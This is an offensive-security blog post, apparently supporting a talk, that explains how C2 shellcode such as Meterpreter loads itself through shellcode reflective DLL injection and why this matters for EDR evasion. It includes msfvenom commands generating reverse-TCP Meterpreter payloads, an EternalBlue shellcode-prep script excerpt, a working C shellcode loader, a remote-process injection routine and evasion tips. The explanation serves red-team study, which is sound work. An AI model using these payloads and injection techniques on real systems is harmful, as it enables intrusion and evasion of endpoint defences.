# https://gatari.dev/posts/long-live-the-shellcode/

<!DOCTYPE html><html lang="en-gb" class="dark"><body data-theme="dark" class=""><div class="wrapper post"><main class="page-content" aria-label="Content"><article><details class="toc" zgotmplz=""><summary><b>Table of Contents</b></summary></details><div class="page-content"><p>This blog post is meant to directly support the <a href="https://www.linkedin.com/posts/n0h4ts_rescheduled-are-you-interested-and-ready-activity-7295820825918611456-Oyyw?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAD7pUncBxZ8Rxa4MkspWW4IiCPHKOwK-brc">talk</a> I did for a N0H4TS fireside chat - you can find the slides: <a href="https://docs.google.com/presentation/d/1qn-JkqwkYZCY391gZNmPZhTw9gYENIbhgRNJAg3dXf0/edit?usp=sharing">here</a>.</p><p><img alt="Slide 1" src="https://gatari.dev/posts/long-live-the-shellcode/Demystifying%20AV_EDR%20Evasion%20(Public).jpg"></p><h2 id="overview">Overview</h2><p>Often when newcomers encounter shellcode, whether through a security course, a CTF challenge, or a blog post - they tend to overlook the underlying mechanics of the code they are executing. This understanding is further abstracted away when using a C2 framework, which handles the intricacies behind the scenes.</p><p>When dealing with simpler defense mechanisms like Anti-Virus (AV), operators typically don’t need a deep understanding of their shellcode’s behavior. However, when attempting to bypass more advanced solutions like <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/">Endpoint Detection and Response (EDR)</a> - I’ve witnessed operators struggle, and entire engagements fail due to a lack of understanding of <em>what they are even evading</em> and <em>what their tools are doing</em>.</p><h2 id="shellcode---a-primer">Shellcode - A Primer</h2><blockquote><p>“shellcode” in this context refers to PIC payloads generated exclusively by C2 frameworks that use the <a href="https://github.com/monoxgas/sRDI">Shellcode Reflective DLL Injection (sRDI)</a> technique, <strong>not</strong> true position-independent shellcode such as those seen <a href="https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows/x64/src">here</a>.</p></blockquote><p>If you have been doing offensive security for a while, you have likely come across “shellcode” in one of many ways. For example, generating a <a href="https://github.com/rapid7/metasploit-payloads">meterpreter</a> payload with <code>msfvenom</code> and the following arguments may be familiar:</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f raw
</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Completing available payloads
</span></span><span class="line"><span class="cl">windows/x64/meterpreter_bind_named_pipe   -- Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
</span></span><span class="line"><span class="cl">windows/x64/meterpreter_bind_tcp          -- Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_http      -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_https     -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_ipv6_tcp  -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
</span></span><span class="line"><span class="cl">windows/x64/meterpreter_reverse_tcp       -- Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.
</span></span></code></pre></div><p>Or, if you have ever used one of the <a href="https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/shellcode/shell_prep.sh">AutoBlue-MS17-010</a> exploit for EternalBlue (MS17-010) - you may have seen the following commands executed to prepare shellcode for the exploit:</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$cmd</span><span class="s2">"</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> Type <span class="m">0</span> to generate a staged payload or <span class="m">1</span> to generate a stageless payload
</span></span><span class="line"><span class="cl">        <span class="nb">read</span> staged
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$staged</span><span class="s2">"</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
</span></span><span class="line"><span class="cl">            msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portOne</span>
</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
</span></span><span class="line"><span class="cl">            msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portTwo</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$staged</span><span class="s2">"</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
</span></span><span class="line"><span class="cl">            msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portOne</span>
</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
</span></span><span class="line"><span class="cl">            msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$portTwo</span>
</span></span><span class="line"><span class="cl">            &lt;...snip...&gt;
</span></span></code></pre></div><h3 id="debugging-shellcode">Debugging Shellcode</h3><p>Rather than going into the theory and source code behind shellcode, I believe it’s more beneficial to understand how some (such as myself) operators get confused when copying and pasting shellcode loaders from the internet. For example, consider the following shellcode loader:</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">...</span> <span class="p">};</span> 
</span></span><span class="line"><span class="cl"><span class="n">INT</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">Addr</span>   <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">Handle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">Addr</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">"[-] VirtualAlloc() failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">RtlCopyMemory</span><span class="p">(</span> <span class="n">Addr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">shellcode</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">Handle</span> <span class="o">=</span> <span class="nf">CreateThread</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Addr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">"[-] CreateThread() failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">WaitForSingleObject</span><span class="p">(</span> <span class="n">Handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>When a debugger is attached to the process with breakpoints set on memory allocation (<code>NtAllocateVirtualMemory</code>), you may notice that (apart from your loader’s calls) - there are additional calls to <code>NtAllocateVirtualMemory</code> made by the shellcode itself.</p><p><img alt="Shellcode Debugging" src="https://gatari.dev/posts/long-live-the-shellcode/b53081b0a2eacc288033e6a60da4c154.png"></p><p>This is because the shellcode uses a technique known as <a href="https://github.com/monoxgas/sRDI">Shellcode Reflective DLL Injection (sRDI)</a> to load itself into memory.</p><h3 id="reflective-dll-injection">Reflective DLL Injection</h3><p>Traditionally, DLLs are loaded from disk using APIs such as <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> or <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryExA</a>. However, the <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">Reflective DLL Injection</a> repository by Stephen Fewer demonstrates how to reflectively load a DLL in memory using a <code>ReflectiveLoader</code> function.</p><p>The <code>ReflectiveLoader</code> function will do the heavy lifting of fixing relocations, import &amp; export tables, copying the DLL headers &amp; sections, and calling the DLL’s entry point. The repository also includes an example of calling the <code>ReflectiveLoader</code> function from the loader using a <code>LoadRemoteLibraryR</code> function.</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">LoadRemoteLibraryR</span><span class="p">(</span> <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwLength</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="cp"># Finds the offset of the ReflectiveLoader() function from the base of the reflective DLL
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">dwReflectiveLoaderOffset</span> <span class="o">=</span> <span class="nf">GetReflectiveLoaderOffset</span><span class="p">(</span> <span class="n">lpBuffer</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cp"># Allocates memory for the reflective DLL
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">lpRemoteLibraryBuffer</span> <span class="o">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">dwLength</span><span class="p">,</span> <span class="n">MEM_RESERVE</span><span class="o">|</span><span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cp"># Writes the reflective DLL allocated memory
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nf">WriteProcessMemory</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">lpRemoteLibraryBuffer</span><span class="p">,</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">dwLength</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cp"># Calculates the absolute address of the ReflectiveLoader() function by adding the offset to the base address
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">lpReflectiveLoader</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)(</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">lpRemoteLibraryBuffer</span> <span class="o">+</span> <span class="n">dwReflectiveLoaderOffset</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cp"># Redirects execution to ReflectiveLoader()-&gt;ReflectiveDLL
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">hThread</span> <span class="o">=</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">,</span> <span class="n">lpReflectiveLoader</span><span class="p">,</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The reflective loading process can be visually represented as follows:</p><p><img alt="Reflective DLL Injection" src="https://gatari.dev/posts/long-live-the-shellcode/e3aaad9ffe2e5912e18c283489086db0.png"></p><p>You may realize that the implementation of <code>LoadRemoteLibraryR</code> closely resembles our shellcode loader, except that execution is redirected to the <code>ReflectiveLoader</code> function rather than the base address of the shellcode.</p><h3 id="shellcode-reflective-dll-injection-srdi">Shellcode Reflective DLL Injection (sRDI)</h3><p>The <a href="https://github.com/monoxgas/sRDI">Shellcode Reflective DLL Injection (sRDI)</a> technique takes advantage of the reflective loading process by embedding a small assembly stub in the <code>ReflectiveDLL</code> itself that will redirect execution to the <code>ReflectiveLoader()</code> function - effectively bypassing the need for the <code>LoadRemoteLibraryR</code> function.</p><p>As a result, the Reflective DLL can now effectively be treated like shellcode - as we can now redirect execution to the base address of the Reflective DLL, and ignore the need for calculating the offset of the <code>ReflectiveLoader</code> function.</p><p><img alt="sRDI" src="https://gatari.dev/posts/long-live-the-shellcode/93f52aa2039d237706d1e717637fcfa6.png"></p><p>For clarity, the stub will only calculate the absolute address of the <code>ReflectiveLoader</code> function and redirect execution to it and omit any allocation of memory as it assumes that the loader has already allocated memory for the Reflective DLL. An example of the above stub can be as simple as:</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c1">; gonna ignore all the setup and just show the stub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="na">...</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>  <span class="no">rbx</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">dll_base_address</span><span class="err">&gt;</span>              <span class="c1">; base address of rDLL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">add</span>  <span class="no">rbx</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">offset_to_ReflectiveLoader</span><span class="p">()</span><span class="err">&gt;</span>  <span class="c1">; &amp;ReflectiveLoader = base + offset
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">call</span> <span class="no">rbx</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>  <span class="no">rax</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">ExitProcess</span>                    <span class="c1">; exit process, alternatively ExitThread()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">call</span> <span class="no">rax</span>
</span></span></code></pre></div><p>A similar stub can be found when decompiling the meterpreter shellcode generated by <code>msfvenom</code> in the DOS header:</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">...</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span>  <span class="no">rbx</span><span class="p">,</span> <span class="mi">0x188D4</span>   <span class="c1">; &amp;ReflectiveLoader = base + 0x188D4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">call</span> <span class="no">rbx</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span>
</span></span></code></pre></div><p>The <code>0x188D4</code> offset is baked into the stub at compile-time, and calculates to the RVA of <code>ReflectiveLoader</code>.</p><p><img alt="RDL" src="https://gatari.dev/posts/long-live-the-shellcode/d2f4ab57d73dd24e2d45b88213ffce09%20(1).png"></p><h2 id="meterpreter-payloads">Meterpreter Payloads</h2><p>We know that Meterpreter’s shellcode is actually a Reflective DLL with a hotpatched DOS header, we can now understand why the shellcode performs memory allocations when debugging. The shellcode is effectively loading itself into memory using the sRDI technique.</p><p>The position-independent nature of meterpreter’s shellcode allows for a plethora of executable formats exposed by <code>msfvenom</code> as the executables simply need to be a shellcode loader. Unfortunately Meterpreter, in fact, is not rewritten in all of these languages:</p><pre tabindex="0"><code>Framework Executable Formats [--format &lt;value&gt;]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    ducky-script-psh
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war
</code></pre><h2 id="considerations-for-evasion">Considerations for Evasion</h2><p>Certain EDR solutions closely analyze memory allocations, and often flag on certain “rules” in memory management. For example, Elastic often flags on <a href="https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts%20unbacked&amp;type=code">unbacked (non-module backed)</a> memory performing some operations.</p><p>Unfortunately, this memory may not always be directly managed by the shellcode loader, but rather by the shellcode itself (in the case of C2s that use Reflective Loading). Some C2 frameworks expose an interface to modify the Reflective Loader such as the <a href="https://www.cobaltstrike.com/product/features/user-defined-reflective-loader">User-Defined Reflective Loader</a> in Cobalt Strike, and obviously operators can freely modify the reflective loader of open-source C2s such as <a href="https://github.com/HavocFramework/Havoc">Havoc</a>.</p><h2 id="conclusion">Conclusion</h2><p>Understanding how shellcode operates is crucial for evading EDR solutions. Some red teams struggle with evasion because they rely on copying shellcode loaders from the internet or using payload generators without modifying the shellcode itself.</p></div></article></main></div><a href="https://gatari.dev/posts/long-live-the-shellcode/#" title="Go to top" id="totop"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"></path></svg>
</a><div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
</body></html>